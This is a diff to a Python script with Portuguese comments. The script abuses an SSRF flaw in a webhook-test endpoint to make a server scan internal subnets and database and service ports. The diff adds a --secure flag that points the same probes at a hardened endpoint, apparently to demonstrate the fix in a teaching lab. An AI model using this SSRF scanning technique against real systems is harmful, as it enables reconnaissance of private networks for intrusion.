@@ -41,6 +41,8 @@ CANDIDATE_SUBNETS = [
 PORTS = [80, 8080, 8000, 8443, 3000, 5432, 6379, 9200, 27017]
 # ==========================================================================
 
+MODE = "vulnerable"  # trocado para "secure" com --secure
+
 FAST_MS = 2000  # abaixo disto, um erro indica host vivo com porta fechada
 
 
@@ -55,7 +57,7 @@ def ssrf_get(token: str, url: str, timeout: float = 8.0) -> dict:
     """Faz o servidor buscar `url` (SSRF) e devolve reached/status/_rtt_ms."""
     start = time.perf_counter()
     try:
-        r = httpx.post(f"{APP_URL}/vulnerable/webhook/test", json={"url": url},
+        r = httpx.post(f"{APP_URL}/{MODE}/webhook/test", json={"url": url},
                        headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
         data = r.json().get("request", {})
     except Exception as exc:  # noqa: BLE001
@@ -108,6 +110,13 @@ if __name__ == "__main__":
     ap.add_argument("--ports", default=",".join(map(str, PORTS)), help="portas por vírgula")
     ap.add_argument("--threads", type=int, default=30)
     ap.add_argument("--timeout", type=float, default=8.0)
+    
+    ap.add_argument("--secure", action="store_true",
+                    help="testa contra /secure/webhook/test (mostra o bloqueio)")
     a = ap.parse_args()
+    
+    if a.secure:
+        MODE = "secure"
+    
     subnets = a.subnet.split(",") if a.subnet else CANDIDATE_SUBNETS
     main(subnets, [int(p) for p in a.ports.split(",")], a.threads, a.timeout)
